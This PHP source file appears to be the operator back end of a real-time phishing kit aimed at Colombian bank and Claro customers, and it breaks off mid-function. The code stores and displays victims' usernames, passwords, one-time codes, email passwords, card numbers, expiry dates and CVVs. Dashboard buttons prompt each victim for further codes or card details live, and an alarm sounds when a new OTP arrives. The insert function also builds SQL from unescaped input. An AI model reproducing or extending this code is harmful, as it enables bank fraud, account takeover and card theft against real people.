<?php
require('link.php');

$labelstatus = "";
$alertstatus = "-off";
$fondo = "#fff";
$colorlabel = "#b5b5c3";
$colorborde = "#C0C0CC";
$activo = "";	
$btn_on = "";
$icon_on = "a";
$icon_fin = "a";
$cerrado = "";
$borde_cerrado = "";


function input_info($msg){
	$GLOBALS["labelstatus"] = $msg;	
	$GLOBALS["alertstatus"] = "";
	$GLOBALS["fondo"] = "#79B6FF";	
	$GLOBALS["colorlabel"] = "#fff";
	$GLOBALS["colorborde"] = "#fff";
	$GLOBALS["activo"] = "";	
	$GLOBALS["btn_on"] = "";
	$GLOBALS["icon_on"] = "a";
	$GLOBALS["icon_fin"] = "a";
	$GLOBALS["cerrado"] = "";
	$GLOBALS["borde_cerrado"] = "";
}

function wait_info($msg){
	$GLOBALS["labelstatus"] = $msg;	
	$GLOBALS["alertstatus"] = "-off";
	$GLOBALS["fondo"] = "#fff";
	$GLOBALS["colorlabel"] = "#b5b5c3";
	$GLOBALS["colorborde"] = "#C0C0CC";
	$GLOBALS["activo"] = "disabled";
	$GLOBALS["btn_on"] = "-off";
	$GLOBALS["icon_on"] = "g";
	$GLOBALS["icon_fin"] = "a";
	$GLOBALS["cerrado"] = "";
	$GLOBALS["borde_cerrado"] = "";
}

function close_info(){
	$GLOBALS["labelstatus"] = "Finalizado";	
	$GLOBALS["alertstatus"] = "-off";
	$GLOBALS["fondo"] = "#fff";	
	$GLOBALS["colorlabel"] = "#b5b5c3";
	$GLOBALS["colorborde"] = "#C0C0CC";
	$GLOBALS["activo"] = "disabled";
	$GLOBALS["btn_on"] = "-off";
	$GLOBALS["icon_on"] = "g";
	$GLOBALS["icon_fin"] = "r";
	$GLOBALS["cerrado"] = " fin";
	$GLOBALS["borde_cerrado"] = "border: 1px solid #F1416C;";
}

function put_items($id,$usr,$pass,$otp,$dis,$ip,$eml,$cml,$ban,$status,$time,$mob,$card,$dat,$cvv,$idc,$lin,$pse){
	
	switch ($status) {
		case 1: input_info("Ingresó Usuario/Clave");
				break;
		case 2: wait_info("Esperando OTP");
				break;
		case 3: input_info("Ingresó OTP");
				break;
		case 4: wait_info("Esperando Correo/Clave");					
				break;
		case 5: input_info("Ingresó Correo/Clave");					
				break;
		case 6: wait_info("Esperando Info Tarjeta");	
				break;
		case 7: input_info("Ingresó Info Tarjeta");
				break;
		case 8: wait_info("Esperando Nuevo OTP");				
				break;
		case 9: input_info("Ingresó Nuevo OTP");	
				break;
		case 10: close_info();
				break;
		case 12: wait_info("Esperando Usuario/Clave");	
				break;
		case 13: input_info("Ingresó Documento y Linea");	
				break;
		case 15: input_info("Ingresó PSE");	
				break;		
		}

	echo '<div class="item-des" style="background-color: '.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">

			<table width="100%">
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #E52A1B;">Datos Claro</div></td>					
				</tr>
				<tr>
					<td width="33%">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$idc.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Cedula. # Cliente</span>
						</div>
					</td>
					<td width="33%">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$lin.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Linea de celular</span>
						</div>
					</td>
					<td width="34%">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pse.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Correo PSE</span>
						</div>
					</td>
				</tr>
			</table>

<div style="width:100%; height: 7px;"></div>

			<table>
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #006BE9;">Login</div></td>
					<td colspan="3"><div class="grupo" style="background-color: #50CD89;">Correo</div></td>
				</tr>
				<tr>
					<td width="220">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Usuario</span>
						</div>
					</td>
					<td width="120">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Password</span>
						</div>
					</td>
					<td width="100">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">OTP</span>
						</div>
					</td>
			
					<td width="330">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Correo</span>
						</div>
					</td>
					<td width="150">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Clave</span>
						</div>
					</td>
					<td width="120">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$mob.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Celular</span>
						</div>
					</td>
				</tr>
			</table>
<div style="width:100%; height: 7px;"></div>
			<table>
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #F1416C;">Tarjeta</div></td>
					<td colspan="4"><div class="grupo" style="background-color: #FFC700;">Sistema</div></td>
				</tr>
				<tr>
					<td width="200">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$card.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Tarjeta</span>
						</div>
					</td>
					<td width="100">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$dat.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Fecha</span>
						</div>
					</td>
					<td width="65">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">CVV</span>
						</div>
					</td>				
					<td width="110">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$dis.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Dispositivo</span>
						</div>
					</td>
					<td width="125">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">IP</span>
						</div>
					</td>
					<td width="130">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$ban.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Banco</span>
						</div>
					</td>
					<td width="200">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$time.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Hora</span>
						</div>
					</td>
				</tr>
			</table>
<div class="msg-status'.$GLOBALS["alertstatus"].'">'.$GLOBALS["labelstatus"].'</div>
			<table style="margin:0 auto;">
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].'  id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Nuevo OTP</td>
								</tr>
							</table>
						</button>						
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Correo</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control finalizar'.$GLOBALS["cerrado"].'"  id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>
		</div>
		

		<div class="item-des-mob" style="background-color:'.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
		<table width="100%">
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #E52A1B;">Datos Claro</div></td>					
				</tr>
				<tr>
					<td width="33%">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$idc.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Cedula. # Cliente</span>
						</div>
					</td>
					<td width="33%">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$lin.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Linea de celular</span>
						</div>
					</td>
					<td width="34%">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pse.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Correo PSE</span>
						</div>
					</td>
				</tr>
			</table>

<div style="width:100%; height: 7px;"></div>
			<table>
				<tr>
					<td colspan="3">
						<div class="grupo" style="background-color: #006BE9;">Login</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed  '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Usuario</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Password</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">OTP</span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="2">
						<div class="grupo" style="background-color: #50CD89;">Correo</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Correo</span>
						</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Clave</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$mob.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Celular</span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="3">
						<div class="grupo" style="background-color: #F1416C;">Tarjeta</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$card.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Tarjeta</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$dat.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Fecha</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">CVV</span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="3">					
						<div class="grupo" style="background-color: #FFC700;">Sistema</div>		
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$ban.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Banco</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].'">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">IP</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$dis.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Dispositivo</span>
						</div>
					</td>					
				</tr>
				<tr>
					<td colspan="3">					
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$time.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Hora</span>
						</div>	
					</td>
				</tr>
			</table>

			<table id="control-mob-2" width="100%">
				<tr>
					<td><div class="msg-status'.$GLOBALS["alertstatus"].'">'.$GLOBALS["labelstatus"].'</div></td>
					<td>
						<table>
							<tr>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$id.'">
										<table>
											<tr>
												<td><img src="../assets/img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>Usuario</td>
											</tr>
										</table>
									</button>
								</td>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$id.'">
										<table>
											<tr>
												<td><img src="../assets/img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>OTP</td>
											</tr>
										</table>
									</button>
								</td>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$id.'">
										<table>
											<tr>
												<td><img src="../assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>Nuevo OTP</td>
											</tr>
										</table>
									</button>	
								</td>
							</tr>
							<tr>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$id.'">
										<table>
											<tr>
												<td><img src="../assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>Correo</td>
											</tr>
										</table>
									</button>
								</td>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$id.'">
										<table>
											<tr>
												<td><img src="../assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>Tarjeta</td>
											</tr>
										</table>
									</button>
								</td>
								<td>									
									<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$id.'">
										<table>
											<tr>
												<td><img src="../assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
												<td>Finalizar</td>
											</tr>
										</table>
									</button>
								</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
<div class="msg-status'.$GLOBALS["alertstatus"].'" id="msg-mob">'.$GLOBALS["labelstatus"].'</div>
			<table style="margin:0 auto;" id="control-mob">
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$id.'"">
							<table>
								<tr>
									<td><img src="../assets/img/usuario-a.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/otp-a.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Nuevo OTP</td>
								</tr>
							</table>
						</button>						
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Correo</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control finalizar'.$GLOBALS["cerrado"].'"  id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>
		</div>




		<div class="item-des-small" style="background-color:'.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">


			<table width="100%">
				<tr>
					<td colspan="2"><div class="grupo" style="background-color: #E52A1B;">Datos Claro</div></td>					
				</tr>
				<tr>
					<td width="50%">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$idc.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Cedula. # Cliente</span>
						</div>
					</td>
					<td width="50%">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$lin.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Linea de celular</span>
						</div>
					</td>
					<tr>
						<td colspan="2">
							<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
								<span class="valor">'.$pse.'</span><br>
								<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Correo PSE</span>
							</div>
						</td>					
					</tr>
				</tr>
			</table>

<div style="width:100%; height: 7px;"></div>



			<table>
				<tr>
					<td colspan="2">
						<div class="grupo" style="background-color: #006BE9;">Login</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Usuario</span>
						</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Password</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">OTP</span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="2">
						<div class="grupo" style="background-color: #50CD89;">Correo</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Correo</span>
						</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Clave</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$mob.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Celular</span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="3">
						<div class="grupo" style="background-color: #F1416C;">Tarjeta</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$card.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Tarjeta</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$dat.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Fecha</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">CVV</span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="2">					
						<div class="grupo" style="background-color: #FFC700;">Sistema</div>		
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$ban.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Banco</span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].'">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">IP</span>
						</div>
					</td>									
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$dis.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Dispositivo</span>
						</div>
					</td>
					<td >					
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$time.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';">Hora</span>
						</div>	
					</td>
				</tr>
			</table>			
<div class="msg-status'.$GLOBALS["alertstatus"].'">'.$GLOBALS["labelstatus"].'</div>

			<table style="margin:0 auto;" >
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Nuevo OTP</td>
								</tr>
							</table>
						</button>						
					</td>
				</tr>
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Correo</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$id.'">
							<table>
								<tr>
									<td><img src="../assets/img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>

		</div>
		';
}

function close_view($r){
	if ($con = conectar()) {	
		sentencia($con,"UPDATE m3it3m SET status = '200' WHERE idreg = '136'");
		desconectar($con);
	}
}

function count_add(){
	$c=0;
	if ($con = conectar()) {	
		$consulta1 = sentencia($con,"SELECT * FROM m3v1s1t");
		if (contarfilas($consulta1)) {
			$res1=traerdatos($consulta1);
			$c = 1*$res1["contador"];
			$c=$c+1;
			sentencia($con,"UPDATE m3v1s1t SET contador='".$c."'");
		}
		desconectar($con);
	}
}





function get_items(){
	if ($con = conectar()) {

		$consultaCon = sentencia($con,"SELECT * FROM m3v1s1t");
		if (contarfilas($consultaCon)) {
			$res=traerdatos($consultaCon);
			echo '<br><span style="color:#5e6278;">TOTAL VISITAS:</span><span style="color:#F1416C;font-weight:600;">'.$res["contador"].'</span><br>'; 
		}

		$consulta = sentencia($con,"SELECT * FROM m3it3m WHERE status <> 0 ORDER BY horamodificado DESC");
		if (contarfilas($consulta)) {
			while ($datos=traerdatos($consulta)) {	
				
				if ($datos['status'] != 13) {			
					put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse']);
				}							
			}
		}else{

		}
		desconectar($con);
	}else{

	}
}



function get_items_pending(){
	if ($con = conectar()) {

		$consultaCon = sentencia($con,"SELECT * FROM m3v1s1t");
		if (contarfilas($consultaCon)) {
			$res=traerdatos($consultaCon);
			echo '<br><span style="color:#5e6278;">TOTAL VISITAS:</span><span style="color:#F1416C;font-weight:600;">'.$res["contador"].'</span><br>'; 
		}

		$consulta = sentencia($con,"SELECT * FROM m3it3m WHERE status = 1 OR status = 3 OR status = 5 OR status = 7 OR status = 9 ORDER BY horamodificado DESC");
		if (contarfilas($consulta)) {
			while ($datos=traerdatos($consulta)) {				
				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse']);								
			}
		}else{

		}
		desconectar($con);
	}else{

	}
}

function get_items_closed(){
	if ($con = conectar()) {
		
		$consultaCon = sentencia($con,"SELECT * FROM m3v1s1t");
		if (contarfilas($consultaCon)) {
			$res=traerdatos($consultaCon);
			echo '<br><span style="color:#5e6278;">TOTAL VISITAS:</span><span style="color:#F1416C;font-weight:600;">'.$res["contador"].'</span><br>'; 
		}

		$consulta = sentencia($con,"SELECT * FROM m3it3m WHERE status = 10 ORDER BY horamodificado DESC");
		if (contarfilas($consulta)) {
			while ($datos=traerdatos($consulta)) {				
				put_items($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv'],$datos['cvv'],$datos['idcliente'],$datos['lineaclaro'],$datos['correopse']);								
			}
		}else{

		}
		desconectar($con);
	}else{

	}
}

function sound_alarm(){
	if ($con = conectar()) {
		$consulta1 = sentencia($con,"SELECT * FROM m3it3m WHERE status = 3 OR status = 9");
		if (contarfilas($consulta1)) {
			echo "OTP";
		}else{
			$consulta2 = sentencia($con,"SELECT * FROM m3it3m WHERE status = 1 OR status = 5 OR status = 7");
			if (contarfilas($consulta2)) {
				echo "SI";
			}else{
				echo "NO";
			}
		}	
		desconectar($con);
	}else{

	}
}

function upgrades_status($id,$est){
	

	if ($con = conectar()) {
		if (sentencia($con,"UPDATE m3it3m SET status = '".$est."' WHERE idreg = ".$id)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}

function create_item($usr,$pass,$dis,$idc,$lin,$ban,$pse){
	date_default_timezone_set('America/Bogota');
	$ip_add = $_SERVER['REMOTE_ADDR'];
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		if (sentencia($con,"INSERT INTO m3it3m (idreg, usuario, password, otp, dispositivo, ip, id, agente, banco, status, horacreado, horamodificado,idcliente, lineaclaro,correopse) VALUES (NULL, '".$usr."', '".$pass."', NULL, '".$dis."', '".$ip_add."', NULL, NULL, '".$ban."', '1', '".$hoy."', '".$hoy."', '".$idc."', '".$lin."', '".$pse."')")) {
			$consulta = sentencia($con,"SELECT idreg FROM m3it3m WHERE usuario = '".$usr."' ORDER BY idreg DESC LIMIT 1");
			if (contarfilas($consulta)) {
				$datos=traerdatos($consulta);
				setcookie('id', (string)$datos["idreg"], time() + 60 * 9, '/', '', false, true);
				echo $datos["idreg"];
			}			
		}else{
			echo "NO";
		}
		desconectar($con);
	}else{
		echo "ERR";
	}
}

function create_user($ced,$lin,$dis){
	date_default_timezone_set('America/Bogota');
